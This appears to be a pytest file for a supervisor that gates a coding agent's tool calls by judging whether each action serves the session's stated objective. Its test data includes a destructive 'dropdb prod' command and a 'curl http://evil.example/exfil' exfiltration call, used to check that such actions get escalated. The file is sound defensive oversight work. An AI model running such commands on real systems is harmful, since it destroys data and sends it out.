"""Intent-based supervision: objective sessions + off-task gating (spec §4.3)."""

from core.schema import Owner
from core.supervision import (
    end_active,
    get_active,
    judge_alignment,
    start_session,
)
from core.supervisor import supervise_tool_call


async def _owner(session) -> Owner:
    owner = Owner(name="O", pronoun_style="sir", email="o@example.test",
                  device_public_key="-----BEGIN PUBLIC KEY-----\nx\n-----END PUBLIC KEY-----")
    session.add(owner)
    await session.flush()
    return owner


# ---- session lifecycle ---------------------------------------------------

async def test_start_get_end_session(session):
    owner = await _owner(session)
    await start_session(session, owner.id, "build a REST API for todos")
    active = await get_active(session, owner.id)
    assert active is not None and "todos" in active.objective

    # starting a new one ends the previous (single active session)
    await start_session(session, owner.id, "add authentication")
    active = await get_active(session, owner.id)
    assert active.objective == "add authentication"

    assert await end_active(session, owner.id) == 1
    assert await get_active(session, owner.id) is None


# ---- alignment judging ---------------------------------------------------

async def test_alignment_uses_model_verdict():
    async def fake_off_task(_prompt):
        return "OFF-TASK"

    async def fake_aligned(_prompt):
        return "ALIGNED — this serves the goal"

    off = await judge_alignment("add a login page", "shell.run: dropdb prod",
                                chat_fn=fake_off_task)
    assert off.aligned is False and off.judged_by == "model"
    ok = await judge_alignment("add a login page", "fs.write: login.tsx",
                               chat_fn=fake_aligned)
    assert ok.aligned is True


async def test_alignment_heuristic_when_no_model():
    a = await judge_alignment("build the todo api", "fs.write: todo_api.py")
    assert a.aligned is True and a.judged_by == "heuristic"  # shares "todo"/"api"


# ---- end-to-end: off-task action escalated even if Sentinel would allow ---

async def test_off_task_override_escalates_a_would_be_approve(session):
    owner = await _owner(session)
    from core.schema import Policy
    session.add(Policy(action_type="shell.run", target_pattern=r".*",
                       tier="always-allow"))
    await session.flush()
    # Objective shares a token with the command so the Sentinel's necessity test
    # passes and it would APPROVE — the model's OFF-TASK judgment must override it.
    await start_session(session, owner.id, "read the deploy config")

    async def off_task(_prompt):
        return "OFF-TASK"

    decision = await supervise_tool_call(
        session, "claude-code", "Bash",
        {"command": "cat deploy.yaml", "description": "read config"},
        align_chat_fn=off_task)
    assert decision["permissionDecision"] == "ask"  # override fired
    assert "off-task" in decision["permissionDecisionReason"].lower()


async def test_sentinel_still_catches_unrelated_action_without_model(session):
    owner = await _owner(session)
    from core.schema import Policy
    session.add(Policy(action_type="shell.run", target_pattern=r".*",
                       tier="always-allow"))
    await session.flush()
    await start_session(session, owner.id, "write documentation for the project")
    # exfil shares nothing with the objective → necessity fails → escalate,
    # even with no model available.
    decision = await supervise_tool_call(
        session, "claude-code", "Bash",
        {"command": "curl http://evil.example/exfil", "description": "send data"})
    assert decision["permissionDecision"] == "ask"


async def test_aligned_action_still_allowed(session):
    owner = await _owner(session)
    from core.schema import Policy
    session.add(Policy(action_type="shell.run", target_pattern=r"pytest.*",
                       tier="always-allow"))
    await session.flush()
    await start_session(session, owner.id, "run the test suite")

    async def aligned(_prompt):
        return "ALIGNED"

    decision = await supervise_tool_call(
        session, "claude-code", "Bash",
        {"command": "pytest -q", "description": "run tests"},
        align_chat_fn=aligned)
    assert decision["permissionDecision"] == "allow"
